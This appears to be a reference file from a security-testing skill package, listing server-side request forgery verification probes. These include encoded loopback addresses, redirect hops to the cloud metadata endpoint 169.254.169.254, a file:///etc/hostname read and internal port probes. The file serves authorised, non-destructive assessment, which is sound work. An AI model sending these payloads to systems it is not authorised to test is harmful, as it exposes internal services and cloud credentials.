# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`ssrf`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `ssrf`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Outward baseline and oracle selection

**Expected differential:** the callback arrives from the server's egress address with the client's own User-Agent, proving the server and not the browser issued the request

```text
url=https://<assessor-controlled-host>/ssrf-baseline
url=https://<assessor-controlled-host>/ssrf-redirect-to-internal
```

### Validator versus resolver disagreement

**Expected differential:** an allowed hostname resolves to an inward address and the fetch succeeds, while the same request with the literal inward hostname is rejected

```text
url=http://<allowed-host-that-resolves-inward>/
url=http://127.0.0.1:8080/healthz
url=http://[::1]:8080/healthz
```

### Numeric and encoded address forms

**Expected differential:** the encoded form reaches the same inward service as the dotted form, which proves the validator and the connector normalise differently

```text
url=http://2130706433:8080/healthz
url=http://0x7f000001:8080/healthz
url=http://0177.0.0.1:8080/healthz
```

### Redirect hop bypass

**Expected differential:** an allowed host returns a 302 to an inward target and the server follows it, which proves redirects are not re-validated

```text
url=https://<allowed-host>/r?to=http://169.254.169.254/latest/meta-data/
url=https://<allowed-host>/r?to=file:///etc/hostname
```

### Reachability oracle (no body reflected)

**Expected differential:** closed and open internal ports produce distinguishable errors or timings, establishing port reachability without reading data

```text
url=http://127.0.0.1:1/
url=http://127.0.0.1:22/
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
